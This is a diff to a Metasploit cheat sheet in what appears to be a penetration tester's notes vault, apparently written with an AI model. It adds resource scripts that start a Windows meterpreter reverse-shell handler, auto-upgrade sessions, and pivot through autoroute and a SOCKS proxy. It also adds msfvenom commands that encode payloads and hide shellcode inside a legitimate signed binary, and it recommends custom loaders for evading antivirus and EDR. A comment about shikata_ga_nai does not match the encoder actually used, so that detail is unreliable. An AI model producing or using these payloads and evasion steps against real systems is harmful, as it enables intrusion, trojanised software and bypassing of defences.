@@ -153,6 +153,13 @@ set ExitOnSession false
 run -j
 ```
 
+**AutoRunScript** — run a post module automatically when a session opens:
+
+```bash
+set AutoRunScript post/multi/manage/shell_to_meterpreter   # auto-upgrade shell → meterpreter
+set AutoRunScript multi_console_command -cl "sysinfo;getuid"  # run multiple commands on connect
+```
+
 > See [[Shells & Payloads]] for full msfvenom payload generation reference.
 
 ---
@@ -398,6 +405,69 @@ end
 
 ---
 
+## Resource Scripts
+
+Automate repetitive msfconsole setup — run a `.rc` file instead of typing commands every session.
+
+```bash
+# Launch msfconsole with a resource script
+msfconsole -r handler.rc
+msfconsole -q -r handler.rc
+
+# Run a resource script from within msfconsole
+resource handler.rc
+```
+
+**Example handler.rc** — auto-starting multi/handler:
+
+```text
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST tun0
+set LPORT 4444
+set ExitOnSession false
+set AutoRunScript post/multi/manage/shell_to_meterpreter
+run -j
+```
+
+**Example pivot.rc** — set up route and socks proxy after getting a session:
+
+```text
+use post/multi/manage/autoroute
+set SESSION 1
+set SUBNET 192.168.1.0
+run
+
+use auxiliary/server/socks_proxy
+set SRVPORT 1080
+set VERSION 5
+run -j
+```
+
+---
+
+## Payload Evasion (msfvenom)
+
+```bash
+# Encode with shikata_ga_nai (multiple passes — note: reliably detected by modern AV)
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 \
+  -e x64/xor_dynamic -i 5 -f exe -o payload.exe
+
+# List available encoders
+msfvenom -l encoders
+
+# Custom executable template — embed shellcode in a legitimate signed binary
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 \
+  -x /path/to/legit.exe -f exe -o payload.exe
+
+# List available formats
+msfvenom --list formats
+```
+
+> [!warning] `shikata_ga_nai` (x86/x64 xor) is heavily signatured — AV vendors have had the decoder stubs for years. For real evasion, pipe msfvenom shellcode into a custom loader (Donut, ScareCrow, Freeze.rs) rather than relying on `-e`. See [[AV & EDR Evasion]].
+
+---
+
 ## Useful One-Liners
 
 ```bash
@@ -442,5 +512,5 @@ msfvenom -l encoders
 ---
 
 *Created: 2026-03-02*
-*Updated: 2026-05-13*
+*Updated: 2026-05-14*
 *Model: claude-sonnet-4-6*
